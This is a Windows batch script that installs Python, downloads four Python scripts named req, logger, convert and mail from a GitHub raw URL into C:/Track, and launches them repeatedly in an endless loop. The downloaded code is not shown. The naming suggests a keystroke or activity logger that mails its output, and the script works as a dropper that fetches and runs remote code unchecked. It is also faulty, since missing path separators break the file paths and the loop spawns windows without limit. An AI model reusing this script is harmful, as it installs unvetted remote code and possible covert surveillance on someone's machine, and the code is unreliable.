@echo off
setlocal enabledelayedexpansion

rem Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python...
    winget install --id Python.Python
) else (
    echo Python is already installed.
)

rem Set the base path to C:/Track
set "BASE_PATH=C:/Track"

rem Create the base path if it does not exist
if not exist "!BASE_PATH!" (
    mkdir "!BASE_PATH!"
)

rem Define GitHub repository URL
set "REPO_URL=https://raw.githubusercontent.com/dhruvoneknotone/Track/main/"  rem Update with your GitHub username and repo

rem Download Python scripts from GitHub
curl -O "!REPO_URL!req.py" --output-dir "!BASE_PATH!"
curl -O "!REPO_URL!logger.py" --output-dir "!BASE_PATH!"
curl -O "!REPO_URL!convert.py" --output-dir "!BASE_PATH!"
curl -O "!REPO_URL!mail.py" --output-dir "!BASE_PATH!"

rem Execute Python scripts
start cmd /k "python "!BASE_PATH!req.py""
if errorlevel 1 goto error 

:loop
rem Check if required files exist
for %%F in (logger.py convert.py mail.py) do (
    if not exist "!BASE_PATH!%%F" (
        echo Error: %%F not found in !BASE_PATH!
        pause
        exit /b 1
    )
)

rem
start cmd /k "python "!BASE_PATH!logger.py""
if errorlevel 1 goto error

start cmd /k "python "!BASE_PATH!convert.py""
if errorlevel 1 goto error

timeout /t 5 /nobreak

start cmd /k "python "!BASE_PATH!mail.py""
if errorlevel 1 goto error

goto loop

:error
echo An error occurred while executing a Python script.
pause
exit /b 1